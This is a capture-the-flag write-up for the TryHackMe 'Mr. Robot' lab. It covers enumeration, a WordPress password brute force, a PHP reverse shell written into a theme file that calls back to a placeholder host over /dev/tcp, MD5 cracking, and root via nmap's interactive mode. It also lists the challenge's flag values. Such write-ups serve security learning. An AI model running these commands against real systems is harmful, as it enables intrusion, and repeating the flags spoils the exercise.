Mr. Robot CTF (THM) – Write-Up

⸻

1. Initial Reconnaissance

The first step was scanning the target using Nmap to identify open ports and running services.

nmap -sC -sV -oN nmap_scan 10.81.173.85

Findings

Open ports:

Port	Service	Version
80	HTTP	Apache

The target was hosting a web server, so the next step was web enumeration.

⸻

2. Directory Enumeration

Directory brute-forcing was performed using Gobuster with the common wordlist.

gobuster dir -u http://10.81.173.85 -w /usr/share/wordlists/dirb/common.txt

Important directories discovered:

/robots.txt
/admin
/blog
/wp-admin
/wp-login
/license
/intro

The most interesting file discovered was:

robots.txt


⸻

3. robots.txt Discovery

Opening:

http://10.81.173.85/robots.txt

revealed:

fsocity.dic
key-1-of-3.txt


⸻

First Flag

Accessing:

http://10.81.173.85/key-1-of-3.txt

revealed the first key.

The second file fsocity.dic was a large password wordlist (~858k entries).

⸻

4. Wordlist Optimization

The wordlist contained many duplicates.
It was optimized before brute forcing.

sort fsocity.dic | uniq > fsocity-sorted.dic

Check size:

cat fsocity-sorted.dic | wc -l

Result:

11451


⸻

5. WordPress Enumeration

Since /wp-login and /wp-admin existed, WordPress scanning was performed.

wpscan --url http://10.81.173.85 --enumerate u

Findings:
	•	WordPress 4.3.1
	•	Theme: twentyfifteen
	•	XMLRPC enabled
	•	Login page available

Username discovered:

elliot


⸻

6. WordPress Password Brute Force

Using the optimized wordlist:

wpscan --url http://10.81.173.85 \
--usernames elliot \
--passwords fsocity-sorted.dic \
--password-attack wp-login

Credentials discovered:

elliot : ER28-0652

Login page:

http://10.81.173.85/wp-login.php


⸻

7. Reverse Shell via WordPress Theme Editor

After logging in as elliot, the WordPress Theme Editor was used.

Navigate to:

Appearance → Theme Editor

Edit the file:

404.php

Insert a reverse shell payload.

Example:

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR-IP/4444 0>&1'");
?>

Start listener:

nc -lvnp 4444

Trigger the shell by visiting the 404 page.

⸻

8. Initial Shell Access

The reverse shell connected as:

daemon

Upgrade the shell:

python3 -c 'import pty;pty.spawn("/bin/bash")'


⸻

9. robot User Access

Navigating to:

/home/robot

Files found:

key-2-of-3.txt
password.raw-md5

key-2-of-3.txt could not be accessed.

The hash file contained:

robot:c3fcd3d76192e4007dfb496cca67e13b

This MD5 hash corresponds to:

abcdefghijklmnopqrstuvwxyz

Switch user:

su robot

Password:

abcdefghijklmnopqrstuvwxyz

Now the second key could be read:

cat key-2-of-3.txt

Second key:

822c73956184f694993bede3eb39f959


⸻

10. Privilege Escalation

Checking for privilege escalation methods revealed that nmap interactive mode was available.

Run:

nmap --interactive

Inside the interactive shell:

!sh

This spawned a root shell.

⸻

11. Root Access

Navigate to root directory:

cd /root
ls

File found:

key-3-of-3.txt

Retrieve final key:

cat key-3-of-3.txt

Final key:

04787ddef27c3dee1ee161b21670b4e4


⸻

Keys Summary

Key	Location	Value
Key 1	/key-1-of-3.txt	First flag
Key 2	/home/robot/key-2-of-3.txt	822c73956184f694993bede3eb39f959
Key 3	/root/key-3-of-3.txt	04787ddef27c3dee1ee161b21670b4e4


⸻

Attack Chain Summary
	1.	Nmap scan → discovered HTTP service
	2.	Gobuster enumeration → found robots.txt
	3.	robots.txt → revealed fsocity.dic and key 1
	4.	WordPress enumeration → found username elliot
	5.	WordPress brute force → password ER28-0652
	6.	WordPress theme editor → reverse shell
	7.	Shell as daemon
	8.	MD5 hash cracked → robot user
	9.	Privilege escalation via nmap interactive
	10.	Root shell → key 3

⸻
